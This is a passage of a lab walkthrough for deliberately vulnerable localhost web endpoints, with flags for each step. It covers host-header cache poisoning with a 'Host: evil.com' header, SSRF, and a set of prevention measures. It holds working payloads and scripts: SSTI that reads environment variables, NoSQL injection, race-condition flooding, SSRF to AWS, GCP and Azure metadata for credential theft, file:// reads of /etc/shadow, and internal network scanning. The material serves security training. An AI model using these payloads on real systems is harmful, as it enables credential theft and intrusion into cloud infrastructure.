**Flag:** `{HOST_HEADER_X_ORIGINAL_HOST_BYPASS}`

#### Step 5: Cache Poisoning
**Objective:** Poison web cache with malicious Host header

**Using curl:**
```bash
# Send request with malicious Host and cache-busting parameter
curl -H "Host: evil.com" "http://localhost:5000/api/vuln/host-header-injection?cb=123"

# Subsequent requests (without malicious Host) get poisoned response
curl "http://localhost:5000/api/vuln/host-header-injection?cb=123"
```

**Attack scenario:**
1. Attacker sends request with `Host: evil.com` and static resource URL
2. CDN/cache stores response with evil.com links
3. All users requesting same URL get poisoned cached response
4. Users click links, redirected to attacker's site

**Flag:** `{HOST_HEADER_CACHE_POISONING}`

### Prevention Measures
- Never use Host header to generate URLs
- Use absolute URLs with hardcoded domain
- Validate Host header against allowlist
- Ignore X-Forwarded-* headers unless from trusted proxy
- Implement proper cache key configuration
- Use `Vary: Host` header to prevent cache poisoning
- Implement request validation at proxy/load balancer level

---

## General Burp Suite Tips for Intermediate Labs

### 1. WebSocket Testing
- Enable WebSocket history in Proxy settings
- Use WebSocket message editor for JSON payloads
- Send WebSocket messages to Repeater for testing

### 2. Race Condition Testing
- Use "Create tab group" in Repeater for parallel requests
- Configure Resource Pool in Intruder for concurrent requests
- Use Turbo Intruder extension for advanced race conditions

### 3. JWT Testing
- Use "JSON Web Token" tab to decode/modify JWTs
- Install "JWT Editor" extension for algorithm confusion
- Use "Decoder" tab for base64 encoding/decoding

### 4. GraphQL Testing
- Install "GraphQL Raider" or "InQL" extension
- Use Repeater with GraphQL content type
- Enable "GraphQL" in Logger++ for query tracking

### 5. Advanced Header Manipulation
- Use "Match and Replace" for automatic header injection
- Configure custom header lists for Intruder attacks
- Use Param Miner extension to discover hidden headers

---

## Automation Scripts

### Python Script Template for API Testing
```python
import requests
import json

class IntermediateLab:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_ssti(self):
        url = f"{self.base_url}/api/vuln/ssti"
        payloads = [
            "{{7*7}}",
            "{{constructor.constructor('return process.env')()}}",
            "{%print(7*7)%}"
        ]
        for payload in payloads:
            response = self.session.get(url, params={"template": payload})
            print(f"Payload: {payload}")
            print(f"Response: {response.text}\n")
    
    def test_nosql(self):
        url = f"{self.base_url}/api/vuln/nosql-injection"
        payloads = [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$regex": "^a"}, "password": {"$ne": ""}}
        ]
        for payload in payloads:
            response = self.session.post(url, json=payload)
            print(f"Payload: {json.dumps(payload)}")
            print(f"Response: {response.text}\n")
    
    def test_race_condition(self):
        import threading
        url = f"{self.base_url}/api/vuln/race-condition/purchase"
        data = {"use_discount": True}
        
        def exploit():
            response = self.session.post(url, json=data)
            print(response.json())
        
        threads = [threading.Thread(target=exploit) for _ in range(50)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

if __name__ == "__main__":
    lab = IntermediateLab()
    lab.test_ssti()
    lab.test_nosql()
    lab.test_race_condition()
```

---

## 10. SSRF via URL Fetcher

### Vulnerability Description
Server-Side Request Forgery (SSRF) allows attackers to make the server perform unauthorized HTTP requests to internal or external resources. URL fetchers that don't properly validate input can be exploited to access internal services, cloud metadata endpoints (AWS, GCP, Azure), read local files, and bypass network restrictions.

### Lab URL
`http://localhost:5000/api/vuln/ssrf`

### Impact
- Access to internal services (databases, admin panels, APIs)
- Cloud metadata exfiltration (AWS/GCP/Azure credentials)
- Local file system access
- Network scanning and port enumeration
- Bypass firewalls and access controls
- Complete infrastructure compromise

### Solution Steps

#### Step 1: Basic SSRF - Localhost Access
**Objective:** Access internal services via localhost

**Using curl:**
```bash
# Try to access localhost
curl "http://localhost:5000/api/vuln/ssrf?url=http://localhost:5000/api/vuln/api-unauth?action=secret"
```

**Using Burp Suite:**
1. Intercept request to `/api/vuln/ssrf`
2. Add parameter: `url=http://localhost:5000/api/vuln/api-unauth?action=secret`
3. Send and observe the response
4. Server makes the request on behalf of the client

**Flag:** `FLAG{ssrf_localhost_access}`

**Response includes:**
- Access to internal API not exposed to internet
- List of internal services (Redis, Elasticsearch, MongoDB)
- Secret data from internal API (admin tokens, DB credentials)

**Explanation:** SSRF allows accessing localhost services that are blocked from external access!

#### Step 2: Internal Network Enumeration
**Objective:** Scan internal network ranges

**Using curl:**
```bash
# Access internal IP addresses
curl "http://localhost:5000/api/vuln/ssrf?url=http://192.168.1.1"
curl "http://localhost:5000/api/vuln/ssrf?url=http://10.0.0.1"
curl "http://localhost:5000/api/vuln/ssrf?url=http://172.16.0.1"
```

**Flag:** `FLAG{ssrf_internal_network_access}`

**Automation script for network scanning:**
```bash
# Scan internal network range
for i in {1..254}; do
  curl "http://localhost:5000/api/vuln/ssrf?url=http://192.168.1.$i" &
done
wait
```

**Explanation:** Use SSRF to enumerate and map internal network infrastructure.

#### Step 3: Cloud Metadata Exploitation - AWS ⭐
**Bypass Technique:** Access AWS EC2 metadata service to extract IAM credentials

**Using curl:**
```bash
# AWS metadata endpoint
curl "http://localhost:5000/api/vuln/ssrf?url=http://169.254.169.254/latest/meta-data/"

# Extract IAM credentials
curl "http://localhost:5000/api/vuln/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials"

# Full credential extraction
curl "http://localhost:5000/api/vuln/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"
```

**Using Burp Suite:**
1. In Repeater, set URL parameter to AWS metadata endpoint
2. Try different metadata paths:
   - `/latest/meta-data/` - List available metadata
   - `/latest/user-data/` - User startup scripts
   - `/latest/meta-data/hostname` - Instance hostname
   - `/latest/meta-data/public-ipv4` - Public IP

**Flag:** `FLAG{ssrf_aws_metadata_exfiltration}`

**Exfiltrated AWS Credentials:**
```json
{
  "AccessKeyId": "ASIA4XXXXXXXXXXXXXXX",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEBwaCXVzLWVhc3QtMSJIMEYCIQDe...",
  "Expiration": "2024-12-31T23:59:59Z"
}
```

**Explanation:** SSRF to AWS metadata service can expose full IAM credentials with admin access!

#### Step 4: Cloud Metadata Exploitation - GCP ⭐
**Bypass Technique:** Access Google Cloud metadata to extract service account tokens

**Using curl:**
```bash
# GCP metadata endpoint (requires specific header in real attacks)
curl "http://localhost:5000/api/vuln/ssrf?url=http://metadata.google.internal/computeMetadata/v1/"

# Service account token
curl "http://localhost:5000/api/vuln/ssrf?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

**Flag:** `FLAG{ssrf_gcp_metadata_access}`

**Exfiltrated GCP Data:**
```json
{
  "project": {
    "projectId": "my-gcp-project-12345",
    "numericProjectId": "123456789"
  },
  "instance": {
    "id": "1234567890123456789",
    "machineType": "n1-standard-2"
  },
  "serviceAccount": {
    "email": "service-account@my-project.iam.gserviceaccount.com",
    "token": "ya29.c.Kl6fB-..."
  }
}
```

**Explanation:** GCP service account tokens enable full API access to Google Cloud resources!

#### Step 5: Cloud Metadata Exploitation - Azure ⭐
**Bypass Technique:** Access Azure instance metadata service

**Using curl:**
```bash
# Azure metadata endpoint
curl "http://localhost:5000/api/vuln/ssrf?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Managed identity token
curl "http://localhost:5000/api/vuln/ssrf?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Flag:** `FLAG{ssrf_azure_metadata_exposed}`

**Explanation:** Azure metadata provides managed identity tokens for accessing Azure resources.

#### Step 6: IP Encoding Bypass ⭐
**Bypass Technique:** Use alternate IP encodings to bypass URL filters

**Using curl:**
```bash
# Decimal encoding: 127.0.0.1 = 2130706433
curl "http://localhost:5000/api/vuln/ssrf?url=http://2130706433/"

# Octal encoding: 127.0.0.1 = 0177.0.0.1
curl "http://localhost:5000/api/vuln/ssrf?url=http://0177.0.0.1/"

# Hexadecimal: 127.0.0.1 = 0x7f.0.0.1
curl "http://localhost:5000/api/vuln/ssrf?url=http://0x7f.0.0.1/"

# Mixed encoding
curl "http://localhost:5000/api/vuln/ssrf?url=http://0x7f.0.0.0x1/"
```

**Flag:** `FLAG{ssrf_ip_encoding_bypass}`

**Explanation:** Filters that block "127.0.0.1" or "localhost" can be bypassed with alternate IP representations.

#### Step 7: File Protocol Access ⭐
**Bypass Technique:** Use file:// protocol to read local files

**Using curl:**
```bash
# Read /etc/passwd
curl "http://localhost:5000/api/vuln/ssrf?url=file:///etc/passwd"

# Read application config
curl "http://localhost:5000/api/vuln/ssrf?url=file:///app/config/database.yml"

# Read sensitive files
curl "http://localhost:5000/api/vuln/ssrf?url=file:///etc/shadow"
curl "http://localhost:5000/api/vuln/ssrf?url=file:///var/www/html/config.php"
```

**Flag:** `FLAG{ssrf_file_protocol_access}`

**Exposed files:**
```
/etc/passwd - System users
/etc/shadow - Password hashes
/app/config/database.yml - DB credentials
/var/www/html/config.php - Application config
```

**Explanation:** File protocol access allows reading arbitrary local files including sensitive configurations!

### Automation Scripts

**Python SSRF Scanner:**
```python
import requests

base_url = "http://localhost:5000/api/vuln/ssrf"

# Test targets
targets = [
    ("Localhost", "http://localhost:5000/api/vuln/api-unauth?action=secret"),
    ("Internal Network", "http://192.168.1.1"),
    ("AWS Metadata", "http://169.254.169.254/latest/meta-data/iam/security-credentials"),
    ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/"),
    ("Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("IP Decimal", "http://2130706433/"),
    ("File Protocol", "file:///etc/passwd"),
]

print("=== SSRF Exploitation Scanner ===\n")
for name, target in targets:
    print(f"Testing: {name}")
    response = requests.get(f"{base_url}?url={target}")
    data = response.json()
    
    if data.get('success'):
        print(f"✓ Success! Flag: {data.get('flag', 'N/A')}")
        if 'vulnerability' in data:
            print(f"  Vulnerability: {data['vulnerability']}")
    else:
        print(f"✗ Failed")
    print()
```

**Bash Network Scanner:**
```bash
#!/bin/bash
BASE_URL="http://localhost:5000/api/vuln/ssrf"

echo "=== Internal Network Scanner ==="
for ip in 192.168.1.{1..10}; do
    echo "Scanning: $ip"
    curl -s "${BASE_URL}?url=http://${ip}" | grep -i "flag\|success"
done

echo -e "\n=== Cloud Metadata Scanner ==="
METADATA_ENDPOINTS=(
    "http://169.254.169.254/latest/meta-data/"
    "http://metadata.google.internal/computeMetadata/v1/"
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
)

for endpoint in "${METADATA_ENDPOINTS[@]}"; do
    echo "Testing: $endpoint"
    curl -s "${BASE_URL}?url=${endpoint}" | grep -i "flag\|AccessKeyId\|token"
done
```

### Advanced SSRF Techniques

**DNS Rebinding Attack:**
1. Register domain that alternates between:
   - External IP (first resolution)
   - Internal IP (second resolution)
2. Server checks external IP (allowed)
3. Actual request goes to internal IP

**Protocol Smuggling:**
```bash
# Try different protocols
curl "http://localhost:5000/api/vuln/ssrf?url=ftp://internal-ftp/"
curl "http://localhost:5000/api/vuln/ssrf?url=dict://localhost:11211/stats"
curl "http://localhost:5000/api/vuln/ssrf?url=gopher://localhost:6379/_INFO"
```

**URL Parser Confusion:**
```bash
# Use @ symbol to confuse parsers
curl "http://localhost:5000/api/vuln/ssrf?url=http://trusted.com@localhost/"

# Use URL encoding
curl "http://localhost:5000/api/vuln/ssrf?url=http://localhost%2f%252e%252e%252f"
```

### Prevention Measures
1. **Whitelist Approach** - Only allow specific domains/IPs
2. **Block Private IP Ranges** - Reject 127.0.0.1, 10.0.0.0/8, 192.168.0.0/16, 169.254.0.0/16
3. **Disable Unused Protocols** - Block file://, gopher://, dict://, etc.
4. **Use Cloud IMDSv2** - Require session tokens for metadata access
5. **Network Segmentation** - Isolate application from internal services
6. **Validate Response Content** - Don't blindly return fetched content
7. **Implement Timeouts** - Prevent hanging on internal requests

**Example secure implementation:**
```javascript
const allowedDomains = ['api.example.com', 'cdn.example.com'];
const blockedRanges = ['127.0.0.0/8', '10.0.0.0/8', '192.168.0.0/16', '169.254.0.0/16'];

function isSafeURL(url) {
  const parsed = new URL(url);
  
  // Only allow HTTP/HTTPS
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    return false;
  }
  
  // Check whitelist
  if (!allowedDomains.includes(parsed.hostname)) {
    return false;
  }
  
  // Resolve and check IP not in private ranges
  const ip = dns.resolve(parsed.hostname);
  if (isPrivateIP(ip, blockedRanges)) {
    return false;
  }
  
  return true;
}
```

---

## Conclusion

These 10 intermediate labs cover advanced web application vulnerabilities with real-world bypass techniques. Each lab includes:
- **Basic exploitation** to understand the vulnerability
- **Bypass techniques** (⭐) to overcome security controls
- **Multiple attack vectors** using curl and Burp Suite
- **Unique flags** for successful exploitation verification

### Key Takeaways:
1. **SSTI**: WAF bypass via alternate delimiters, filter evasion through attribute chaining
2. **LDAP**: Wildcard injection, comment injection, boolean-based blind extraction
3. **NoSQL**: Operator abuse ($gt, $regex, $where), JavaScript execution
4. **JWT**: Algorithm confusion, "none" bypass, weak secret cracking
5. **CSRF**: SameSite=None exploitation, predictable token bypass
6. **GraphQL**: Introspection bypass, query batching, depth limit evasion
7. **WebSocket**: Origin validation bypass, cross-site hijacking
8. **Race Condition**: TOCTOU exploitation, parallel request flooding
9. **Host Header**: X-Forwarded-Host bypass, cache poisoning
10. **SSRF**: Cloud metadata exfiltration (AWS/GCP/Azure), IP encoding bypass, file protocol access

### Next Steps:
1. Practice each lab systematically
2. Document all successful bypasses
3. Understand the underlying vulnerability principles
4. Apply knowledge to real-world penetration testing (responsibly)
5. Always follow responsible disclosure practices

Remember: These techniques are for educational purposes in controlled environments only.
